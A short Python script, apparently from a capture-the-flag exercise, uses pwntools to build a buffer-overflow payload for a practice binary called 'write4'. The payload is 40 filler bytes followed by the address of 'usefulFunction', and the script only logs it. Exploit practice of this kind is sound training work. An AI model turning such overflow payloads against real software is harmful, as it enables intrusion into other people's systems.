from pwn import *
elf = ELF('./write4')

usefulFunction = elf.symbols['usefulFunction']
payload = flat( 
    b'A'*40,
    usefulFunction
)

log.info(payload)
